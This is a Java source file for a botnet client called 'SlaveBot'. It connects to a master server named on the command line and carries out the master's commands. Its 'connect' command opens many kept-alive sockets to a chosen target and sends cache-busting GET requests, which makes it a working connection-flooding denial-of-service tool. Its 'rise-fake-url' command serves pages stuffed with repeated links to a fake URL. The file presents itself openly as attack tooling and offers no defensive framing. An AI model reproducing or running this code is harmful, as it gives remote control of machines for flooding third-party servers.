
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.Charset;
import java.util.*;
import java.text.*;

import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

class SocketConnection {
	String registrationDate;
	String targetHostIP;
	String targetAddressName;
	int targetPortNumber;
	Socket targetSocket;

	SocketConnection() {
		registrationDate = new SimpleDateFormat("yyyy-MM-dd").format(new Date());
	}
}

public class SlaveBot {

	public static ArrayList<SocketConnection> connectionList = new ArrayList<SocketConnection>();;
	public static Socket theSocket;

	private static final String CHAR_LIST = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
	private static final int RANDOM_STRING_LENGTH = 5;
	
	
	
	
	static class HomePageHandler implements HttpHandler {
		
		public String fakeUrl;
		public HomePageHandler(String fakeUrl) {
			this.fakeUrl = fakeUrl;
		}
		
        @Override
        public void handle(HttpExchange t) throws IOException {
            String response = "<html>Hi, Welcome to the Home Page<br/>";
            String page1Link = "<a href='/page1'>Page1</a><br/>";
            String page2Link = "<a href='/page2'>Page2</a><br/>";

            String fakeUrlLink = "<a href='//" + fakeUrl +"'>check this out</a><br/></html>";
            response = response + page1Link + page2Link + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink;
            
            Headers h = t.getResponseHeaders();
            h.set("Content-Type","text/html");
            
            
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }

    }
	

	static class Page1Handler implements HttpHandler {
		
		public String fakeUrl;
		public Page1Handler(String fakeUrl) {
			this.fakeUrl = fakeUrl;
		}
		
        @Override
        public void handle(HttpExchange t) throws IOException {
            String response = "<html>Hi, Welcome to the Page1 <br/>";
            String page2Link = "<a href='/page2'>Page2</a><br/>";
	    
            String homePageUrlLink = "<a href='/'>HomePage</a><br/>";
            String fakeUrlLink = "<a href='//" + fakeUrl +"'>check this out</a><br/></html>";
            response = response + homePageUrlLink + page2Link + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink;
            
            Headers h = t.getResponseHeaders();
            h.set("Content-Type","text/html");
            
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }

    }
	

	static class Page2Handler implements HttpHandler {
		
		public String fakeUrl;
		public Page2Handler(String fakeUrl) {
			this.fakeUrl = fakeUrl;
		}
		
        @Override
        public void handle(HttpExchange t) throws IOException {
            String response = "<html>Hi, Welcome to the Page2<br/>";
            String homePageUrlLink = "<a href='/'>HomePage</a><br/>";
            String page1Link = "<a href='/page1'>Page1</a><br/>";
	    
            String fakeUrlLink = "<a href='//" + fakeUrl +"'>check this out</a><br/></html>";
            
            
            Headers h = t.getResponseHeaders();
            h.set("Content-Type","text/html");
            
            
            response = response + homePageUrlLink + page1Link + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink + fakeUrlLink;
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }

    }

	

	
	
	
	/**
	 * Method to launch webserver at the specified port and stream some fake web pages with fake url in them.
	 * 
	 * @param port
	 * @param fakeUrl
	 */
	private static HttpServer handleFakeUrlCommand(int port, String fakeUrl) {
		
		HttpServer server = null;
			try {
				server = HttpServer.create(new InetSocketAddress(port), 0);
				server.createContext("/", new HomePageHandler(fakeUrl));
				server.createContext("/page1", new Page1Handler(fakeUrl));
				server.createContext("/page2", new Page2Handler(fakeUrl));
				
		        server.setExecutor(null); // creates a default executor
		        server.start();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			return server;
        
	}

	/**
	 * This method generates random string
	 * 
	 * @return
	 */
	public static String generateRandomString() {

		StringBuffer randStr = new StringBuffer();
		for (int i = 0; i < RANDOM_STRING_LENGTH; i++) {
			int number = getRandomNumber();
			char ch = CHAR_LIST.charAt(number);
			randStr.append(ch);
		}
		return randStr.toString();
	}

	/**
	 * This method generates random numbers
	 * 
	 * @return int
	 */
	private static int getRandomNumber() {
		int randomInt = 0;
		Random randomGenerator = new Random();
		randomInt = randomGenerator.nextInt(CHAR_LIST.length());
		if (randomInt - 1 == -1) {
			return randomInt;
		} else {
			return randomInt - 1;
		}
	}

	public static SocketConnection connectToServer(final String targetHostName, final int targetHostPort,
			final String urlPath, final boolean keepAlive) throws Exception {
		// System.out.println("Got an call to connect");
		Socket targetSocket;
		try {
			targetSocket = new Socket(targetHostName, targetHostPort);
			targetSocket.setKeepAlive(keepAlive);
			SocketConnection socketConnection = new SocketConnection();
			socketConnection.targetHostIP = targetSocket.getInetAddress().getHostAddress();
			socketConnection.targetAddressName = targetSocket.getInetAddress().getHostName();
			socketConnection.targetPortNumber = targetHostPort;
			socketConnection.targetSocket = targetSocket;

			// System.out.println(" connection established for socket with
			// following credentials "
			// + targetHostName+" " + targetHostPort);
			// System.out.println("Socket connected ::" +
			// targetSocket.isConnected());

			if (urlPath != "") {

				final String randomString = generateRandomString();
				// Instantiates a new PrintWriter passing in the sockets output
				// stream
				PrintWriter wtr = new PrintWriter(targetSocket.getOutputStream());

				// Prints the request string to the output stream
				wtr.println("GET " + urlPath + randomString + " HTTP/1.1");
				wtr.println("Host: " + targetHostName);
				wtr.println("");
				wtr.flush();

				// Creates a BufferedReader that contains the server response
				/*
				 * BufferedReader bufRead = new BufferedReader( new
				 * InputStreamReader(targetSocket.getInputStream())); String
				 * outStr;
				 * 
				 * //Prints each line of the response while((outStr =
				 * bufRead.readLine()) != null){ //System.out.println(outStr); }
				 * 
				 * 
				 * //Closes out buffer and writer bufRead.close();
				 */
				wtr.close();
			}

			return socketConnection;
		} catch (Exception e) {
			throw new Exception(" could not open connection for  " + targetHostName + " " + targetHostPort);
		}

	}

	public static SocketConnection connectToServer(final String targetHostName, final int targetHostPort)
			throws Exception {
		Socket targetSocket;
		try {
			targetSocket = new Socket(targetHostName, targetHostPort);
			SocketConnection socketConnection = new SocketConnection();
			socketConnection.targetHostIP = targetSocket.getInetAddress().getHostAddress();
			socketConnection.targetAddressName = targetSocket.getInetAddress().getHostName();
			socketConnection.targetPortNumber = targetHostPort;
			socketConnection.targetSocket = targetSocket;

			System.out.println(" connection established for socket with following credentials " + targetHostName + " "
					+ targetHostPort);
			return socketConnection;
		} catch (Exception e) {
			throw new Exception(" could not open connection for  " + targetHostName + " " + targetHostPort);
		}
	}

	public static void main(String[] args) throws Exception {
		if (args.length < 4) {
			System.out.println("Error in the arguments provided");
			System.exit(-1);
		}

		String hostname = "";
		String port = "";

		for (int t = 0; t < 3; t++) {
			if (args[t].equals("-h")) {
				hostname = args[t + 1];
			} else if (args[t].equals("-p")) {
				port = args[t + 1];
			}
		}

		if (hostname.equals("") || port.equals("")) {
			System.out.println("Error in the arguments provided");
			System.exit(-1);
		}

		try {
			Integer.parseInt(port);
		} catch (Exception e) {
			System.out.println("port number should be an integer.");
			System.exit(-1);
		}

		theSocket = new Socket(hostname, Integer.parseInt(port));
		BufferedReader netIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));

		HttpServer server = null;
		// System.out.println("Connected to master and waiting for a command.");
		while (true) {
			try {
				String theLine = netIn.readLine();
				// System.out.println("Server Command : "+ theLine);
				if (theLine != "") {
					String[] serverCommand = theLine.split(" ");
					// System.out.println(serverCommand[0]);

					/**
					 * Handler to handle the FakeUrl command
					 */
					if (serverCommand[0].equals("rise-fake-url")) {
						
						int webServerPort = Integer.parseInt(serverCommand[1]);
						String fakeUrl = serverCommand[2];
						
						if(server == null) {
							server = handleFakeUrlCommand(webServerPort, fakeUrl);
							//String command="gio open http://localhost:";
							//command+= webServerPort;
							//Runtime.getRuntime().exec(command);
						}
					} else if (serverCommand[0].equals("down-fake-url")) {
						if(server != null) {
							System.out.println("Stopping server");
							server.stop(0);
						}
					}
					else if (serverCommand[0].equals("connect")) {
						if (serverCommand[1] != null && serverCommand[2] != null && serverCommand[3] != null) {

							// Connecting to remote host
							try {

								// System.out.println("Server command " +
								// serverCommand[1]
								// + " " + serverCommand[2]
								// + " " + serverCommand[3]
								// + " " + serverCommand[4]);
								String targetHostName = serverCommand[1];
								int targetPort = Integer.parseInt(serverCommand[2]);
								int numberOfConnections = Integer.parseInt(serverCommand[3]);
								boolean keepAlive = Boolean.parseBoolean(serverCommand[4]);
								String urlPath = "";
								if (serverCommand.length > 5) {
									urlPath = serverCommand[5];
								}

								for (int i = 0; i < numberOfConnections; i++) {
									// connectionList.add(connectToServer(targetHostName,
									// targetPort));

									connectionList.add(connectToServer(targetHostName, targetPort, urlPath, keepAlive));
								}
							} catch (Exception e) {
								System.out.println(e.getMessage());
							}

						} else {
							System.out.println("proper arguments required for connect");
						}

					} else if (serverCommand[0].equals("disconnect")) {
						if (serverCommand[1] != null) {

							ArrayList<SocketConnection> s = new ArrayList<SocketConnection>();
							Iterator iterator = connectionList.iterator();
							while (iterator.hasNext()) {
								SocketConnection o = (SocketConnection) iterator.next();
								if (!s.contains(o))
									s.add(o);
							}

							int isIp = 0;
							String target = serverCommand[1];

							if (target.matches(
									"^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true) {
								isIp = 1;
							} else {
								isIp = 0;
							}

							int targetport = 0;
							if (serverCommand[2] != null) {
								targetport = Integer.parseInt(serverCommand[2].toString());
							}
							Iterator<SocketConnection> it = s.iterator();
							switch (isIp) {
							case 1:
								while (it.hasNext()) {
									SocketConnection s1 = it.next();
									if (targetport == 0) {
										if (s1.targetHostIP.equals(target)) {
											s1.targetSocket.close();
											it.remove();
										}
									} else {
										if (s1.targetHostIP.equals(target) && s1.targetPortNumber == targetport) {
											s1.targetSocket.close();
											it.remove();
										}
									}

								}
								break;
							case 0:
								while (it.hasNext()) {
									SocketConnection s1 = it.next();
									if (targetport == 0) {
										if (s1.targetAddressName.equals(target)) {
											s1.targetSocket.close();
											it.remove();
										}
									} else {
										if (s1.targetAddressName.equals(target) && s1.targetPortNumber == targetport) {
											s1.targetSocket.close();
											it.remove();
										}
									}

								}
								break;
							}
							connectionList = s;
							// System.out.println("******************************************************");
							// System.out.println("Remaining Connections");
							// for(int i=0;i<connectionList.size(); i++){
							// System.out.println(connectionList.get(i).targetAddressName+"\t"+connectionList.get(i).targetHostIP
							// + "\t"+
							// connectionList.get(i).targetPortNumberNumber +
							// "\t"+ connectionList.get(i).registrationDate);

							// }
							// System.out.println("******************************************************");

						} else {
							System.out.println("proper arguments required for disconnect");
						}
					} else {
						System.out.println(" not a proper command " + serverCommand[0]);
					}

				}
			}

			catch (Exception e) {
				e.printStackTrace();
				System.exit(-1);
			}
		}

	}

}
